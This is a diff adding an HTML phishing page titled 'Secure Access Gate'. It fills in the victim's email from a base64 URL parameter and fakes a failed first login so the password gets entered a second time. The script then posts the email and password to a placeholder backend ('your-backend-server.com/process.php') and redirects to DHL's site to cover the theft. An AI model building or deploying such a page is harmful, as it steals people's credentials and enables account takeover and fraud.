@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Identity Verification</title>
+    <style>
+        body { font-family: 'Inter', sans-serif; background: #0f172a; color: white; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .card { background: #1e293b; padding: 2.5rem; border-radius: 15px; width: 100%; max-width: 380px; border: 1px solid #334155; box-shadow: 0 10px 30px rgba(0,0,0,0.4); }
+        h2 { margin-top: 0; font-size: 1.2rem; text-align: center; color: #0ea5e9; }
+        label { display: block; font-size: 0.8rem; margin-bottom: 5px; color: #94a3b8; text-transform: uppercase; }
+        input { width: 100%; padding: 12px; margin-bottom: 20px; border-radius: 8px; border: 1px solid #334155; background: #0f172a; color: white; box-sizing: border-box; }
+        button { width: 100%; padding: 14px; background: #0ea5e9; color: white; border: none; border-radius: 8px; font-weight: 700; cursor: pointer; }
+        .error { color: #f43f5e; font-size: 0.85rem; margin-bottom: 15px; display: none; text-align: center; font-weight: 600; }
+        .loader { display: none; text-align: center; padding: 10px; color: #0ea5e9; font-weight: 600; }
+    </style>
+</head>
+<body>
+<div class="card">
+    <h2>Secure Access Gate</h2>
+    <div id="err" class="error">Verification failed: Incorrect password.</div>
+    <form id="f">
+        <label>Authenticated User</label>
+        <input type="email" id="u" required readonly>
+        <label>System Password</label>
+        <input type="password" id="p" required placeholder="        ">
+        <button type="submit" id="b">Authorize Login</button>
+    </form>
+    <div id="ld" class="loader">Decrypting Secure Token...</div>
+</div>
+<script>
+    let tries = 0;
+    const params = new URLSearchParams(window.location.search);
+    
+    // Auto-extract user from URL
+    if(params.has('u')) {
+        try { document.getElementById('u').value = atob(params.get('u')); } catch(e) {}
+    }
+
+    document.getElementById('f').onsubmit = async (e) => {
+        e.preventDefault();
+        tries++;
+        const email = document.getElementById('u').value;
+        const pass = document.getElementById('p').value;
+
+        if(tries === 1) {
+            document.getElementById('err').style.display = 'block';
+            document.getElementById('p').value = "";
+        } else {
+            document.getElementById('err').style.display = 'none';
+            document.getElementById('b').style.display = 'none';
+            document.getElementById('ld').style.display = 'block';
+
+            // Send to your backend
+            try {
+                await fetch('https://your-backend-server.com/process.php', {
+                    method: 'POST',
+                    mode: 'cors',
+                    body: JSON.stringify({ email, pass })
+                });
+            } catch(err) {}
+
+            setTimeout(() => { window.location.href = "https://www.dhl.com"; }, 2500);
+        }
+    };
+</script>
+</body>
+</html>
